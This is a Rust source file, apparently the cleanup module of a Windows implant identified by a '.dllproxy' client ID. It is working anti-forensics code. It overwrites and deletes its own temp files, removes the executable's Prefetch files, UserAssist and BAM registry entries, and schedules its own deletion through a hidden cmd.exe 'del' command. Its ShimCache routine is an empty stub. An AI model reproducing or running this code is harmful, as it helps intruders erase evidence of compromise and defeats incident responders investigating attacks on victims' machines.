use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

use winreg::enums::*;
use winreg::RegKey;

pub fn run() {
    eprintln!("[*] Cleanup: removing traces...");

    let exe_path = env::current_exe().unwrap_or_default();
    let exe_name = exe_path.file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("agent.exe")
        .to_uppercase();

    delete_own_files();
    clean_prefetch(&exe_name);
    clean_userassist(&exe_path);
    clean_bam(&exe_path);
    clean_shimcache();
    self_delete(&exe_path);
}

// ── 1. Delete our files ──────────────────────────────────────

fn delete_own_files() {
    let temp = env::temp_dir();

    // Client ID
    let id_file = temp.join(".dllproxy_id");
    if try_secure_delete(&id_file) {
        eprintln!("[+] Deleted client ID file");
    }

    // Scanner temp artifacts (.~scan* files we might have left)
    if let Ok(entries) = fs::read_dir(&temp) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with(".~scan") || name.starts_with(".dllproxy") {
                try_secure_delete(&entry.path());
            }
        }
    }

    // Proxy framework temp extractions
    let proxy_fw_dir = temp.join("proxy_fw");
    if proxy_fw_dir.exists() {
        let _ = fs::remove_dir_all(&proxy_fw_dir);
        eprintln!("[+] Deleted proxy_fw temp directory");
    }
}

// ── 2. Prefetch ──────────────────────────────────────────────
// C:\Windows\Prefetch\<EXENAME>-<HASH>.pf
// Records that our binary was executed. Requires admin to delete.

fn clean_prefetch(exe_name_upper: &str) {
    let prefetch_dir = Path::new(r"C:\Windows\Prefetch");
    if !prefetch_dir.is_dir() {
        return;
    }

    let prefix = format!("{}-", exe_name_upper.replace(".EXE", ".EXE"));
    let mut cleaned = 0;
    if let Ok(entries) = fs::read_dir(prefetch_dir) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_uppercase();
            if name.starts_with(&prefix) && name.ends_with(".PF") {
                if try_secure_delete(&entry.path()) {
                    cleaned += 1;
                }
            }
        }
    }
    if cleaned > 0 {
        eprintln!("[+] Deleted {} prefetch entries", cleaned);
    }
}

// ── 3. UserAssist ────────────────────────────────────────────
// HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count
// Keys are ROT13-encoded paths of executed programs.

fn clean_userassist(exe_path: &Path) {
    let path_str = exe_path.to_string_lossy().to_string();
    let rot13_path = rot13(&path_str);

    let base = r"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist";
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    if let Ok(ua_key) = hkcu.open_subkey(base) {
        for guid in ua_key.enum_keys().flatten() {
            let count_path = format!(r"{}\{}\Count", base, guid);
            if let Ok(count_key) = hkcu.open_subkey_with_flags(&count_path, KEY_ALL_ACCESS) {
                if count_key.delete_value(&rot13_path).is_ok() {
                    eprintln!("[+] Cleaned UserAssist entry");
                }
            }
        }
    }
}

fn rot13(input: &str) -> String {
    input.chars().map(|c| match c {
        'a'..='m' | 'A'..='M' => (c as u8 + 13) as char,
        'n'..='z' | 'N'..='Z' => (c as u8 - 13) as char,
        _ => c,
    }).collect()
}

// ── 4. BAM (Background Activity Moderator) ───────────────────
// HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\<SID>\
// Stores paths of recently executed programs. Requires admin.

fn clean_bam(exe_path: &Path) {
    let path_device = to_device_path(exe_path);
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let bam_base = r"SYSTEM\CurrentControlSet\Services\bam\State\UserSettings";

    if let Ok(bam_key) = hklm.open_subkey(bam_base) {
        for sid in bam_key.enum_keys().flatten() {
            let sid_path = format!(r"{}\{}", bam_base, sid);
            if let Ok(sid_key) = hklm.open_subkey_with_flags(&sid_path, KEY_ALL_ACCESS) {
                // Try both regular path and device path formats
                let deleted = sid_key.delete_value(exe_path.to_string_lossy().as_ref()).is_ok()
                    || sid_key.delete_value(&path_device).is_ok();
                if deleted {
                    eprintln!("[+] Cleaned BAM entry");
                }
            }
        }
    }
}

fn to_device_path(path: &Path) -> String {
    // Convert C:\... to \Device\HarddiskVolume...\...
    // Simplified: BAM often stores as \Device\HarddiskVolumeX\path
    // We try the common format; exact volume number varies per system
    let path_str = path.to_string_lossy();
    if let Some(rest) = path_str.strip_prefix("C:\\") {
        format!(r"\Device\HarddiskVolume3\{}", rest)
    } else {
        path_str.to_string()
    }
}

// ── 5. ShimCache (AppCompatCache) ────────────────────────────
// Binary blob in registry — we flush it by nudging the service.
// Can't surgically remove entries without parsing the binary format,
// but we can try to get the cache to flush without our entry by
// being quick about our cleanup.

fn clean_shimcache() {
    // ShimCache is written on shutdown. If we clean up and the system
    // doesn't shut down cleanly after our execution, our entry may
    // not persist. Best we can do without parsing the binary blob.
}

// ── 6. Self-delete ───────────────────────────────────────────

fn self_delete(exe_path: &Path) {
    let exe_str = exe_path.to_string_lossy();

    // Overwrite our binary with zeros before deletion (anti-recovery)
    if let Ok(metadata) = fs::metadata(exe_path) {
        let size = metadata.len() as usize;
        if let Ok(()) = fs::write(exe_path, vec![0u8; size.min(1024 * 1024)]) {
            eprintln!("[+] Overwrote binary content");
        }
    }

    // Spawn a detached cmd.exe that waits for us to exit, then deletes
    // Uses /w flag style with choice for a clean delay
    let script = format!(
        r#"/c choice /c y /n /d y /t 2 >nul & del /f /q "{exe}" & choice /c y /n /d y /t 1 >nul & rmdir /q "{dir}" 2>nul"#,
        exe = exe_str,
        dir = exe_path.parent().map(|p| p.to_string_lossy()).unwrap_or_default(),
    );

    let _ = Command::new("cmd")
        .args([&script])
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();

    eprintln!("[+] Self-delete scheduled");
}

// ── Helpers ──────────────────────────────────────────────────

fn try_secure_delete(path: &Path) -> bool {
    if !path.exists() {
        return false;
    }
    // Overwrite with zeros before deleting (hinder recovery)
    if let Ok(meta) = fs::metadata(path) {
        let size = meta.len() as usize;
        let _ = fs::write(path, vec![0u8; size.min(64 * 1024)]);
    }
    fs::remove_file(path).is_ok()
}
